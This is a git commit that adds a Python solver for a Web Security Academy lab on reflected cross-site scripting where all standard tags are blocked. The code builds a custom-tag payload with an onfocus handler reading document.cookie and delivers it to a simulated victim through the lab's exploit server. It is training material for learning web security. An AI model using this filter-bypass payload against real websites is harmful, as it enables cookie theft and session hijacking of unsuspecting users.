e2db126e396c28a790bcaa4dbba2ea0739a2b979
Alvin Nguyen <alvinonguyen00@gmail.com>
2024-04-04 04:02:15 -0700

    Reflected XSS into HTML context with all tags blocked except custom ones

---
+++ web_security_academy/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked.py
@@ -0,0 +1,10 @@
+from web_security_academy.core.logger import logger
+
+
+def solve_lab(session):
+    xss = "<xss id=x onfocus=alert(document.cookie) tabindex=1>"
+    script = f"""<script>document.location = "{session.url}?search={xss}#x"</script>"""
+
+    server = session.exploit_server()
+    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
+    server.deliver_exploit_to_victim("/exploit", headers, script)
